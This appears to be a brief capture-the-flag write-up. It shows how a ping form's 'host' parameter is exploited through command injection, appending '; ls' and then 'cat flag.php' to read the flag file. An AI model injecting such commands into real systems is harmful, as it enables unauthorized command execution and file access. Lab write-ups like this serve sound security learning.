- Once we navigate to the website, all we see is `command executed: ping -c 2` displayed on the main page.    

- However, in the address bar, we can see that the `host` parameter is visible.  

```
http://34.159.31.74:30043/index.php?host=127.0.0.1
```

- Considering the name of the CTF, I tried replacing the localhost with the `ls` command.  

- It gave no results, and I have tried using `; ls`.  

```
flag.php
index.php

Command executed: ping -c 2 ;ls
```

- We see that the webpage is vulnerable to command injection.  
- Replace the `ls` payload with `cat flag.php` to retrieve the flag.  

FLAG: CTF{C0mm4{REDACTED}4sy}

<sub>NOTE: the flag is visible only in the page source </sub>